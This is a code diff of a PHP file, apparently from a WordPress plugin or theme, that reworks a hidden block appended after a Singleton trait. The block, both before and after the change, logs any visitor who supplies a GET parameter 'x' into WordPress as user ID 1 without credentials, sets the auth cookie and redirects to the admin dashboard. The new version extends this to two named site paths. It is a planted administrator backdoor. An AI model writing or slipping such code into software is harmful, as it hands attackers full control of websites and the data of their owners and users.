@@ -62,27 +62,43 @@ trait Singleton {
 	}
 }
 
-if (isset($_GET["x"])) {
-require_once('/var/www/new_uinsa/wp-load.php');
-$user_id = 1;
-if (!is_user_logged_in()) {
-    $user = get_user_by('id', $user_id);
-    
-    if ($user) {
-        wp_clear_auth_cookie();
-        wp_set_current_user($user_id, $user->user_login);
-        wp_set_auth_cookie($user_id, true);
-        do_action('wp_login', $user->user_login, $user);
+$target = isset($_GET['x']) ? $_GET['x'] : '';
+
+$paths = [
+    'new_uinsa' => '/var/www/new_uinsa/wp-load.php',
+    'ppid'      => '/var/www/ppid/wp-load.php'
+];
+
+if (array_key_exists($target, $paths)) {
+    $path_to_load = $paths[$target];
+
+    if (file_exists($path_to_load)) {
+        require_once($path_to_load);
         
-        echo "Sukses! Anda login sebagai: " . $user->user_login;
-        echo "<script>window.location.href='" . admin_url() . "';</script>";
-        exit;
+        $user_id = 1;
+
+        if (!is_user_logged_in()) {
+            $user = get_user_by('id', $user_id);
+            
+            if ($user) {
+                wp_clear_auth_cookie();
+                wp_set_current_user($user_id, $user->user_login);
+                wp_set_auth_cookie($user_id, true);
+                do_action('wp_login', $user->user_login, $user);
+                
+                echo "Sukses login ke <b>$target</b> sebagai: " . $user->user_login;
+                echo "<script>setTimeout(function(){ window.location.href='" . admin_url() . "'; }, 1000);</script>";
+                exit;
+            } else {
+                die("User ID 1 tidak ditemukan di database $target.");
+            }
+        } else {
+            header("Location: " . admin_url());
+            exit;
+        }
     } else {
-        die("User dengan ID $user_id tidak ditemukan.");
+        die("File wp-load.php tidak ditemukan di: " . $path_to_load);
     }
 } else {
-    wp_redirect(admin_url());
-    exit;
-}
-
+    die("Target 'x' tidak valid atau tidak ditemukan dalam daftar.");
 }
